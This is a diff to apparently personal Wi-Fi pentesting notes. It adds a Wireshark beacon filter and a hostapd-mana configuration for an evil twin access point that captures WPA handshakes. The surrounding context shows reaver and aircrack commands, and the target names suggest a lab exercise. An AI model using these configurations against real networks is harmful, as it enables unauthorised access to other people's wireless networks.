@@ -1,3 +1,6 @@
+# Useful Wireshark Filter
+```wlan.fc.type_subtype == 0x08 && wlan.ssid == "<targetname>" ```
+
 # Capturing handshakes  
 
 ## Starting monitor mode  
@@ -36,3 +39,18 @@ Aircrack with john rules
 May need -K  
 ```sudo reaver -b <bssid> -i wlan0mon -v -K```
 
+# Evil Twin with hostapd-mana
+Wiki: https://github.com/sensepost/hostapd-mana/wiki
+
+```
+interface=wlan0
+ssid=groupB_target_3
+channel=3
+hw_mode=g
+ieee80211n=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=ANYPASSWORD
+rsn_pairwise=CCMP
+mana_wpaout=/home/kali/groupB_target_3.hccapx
+```
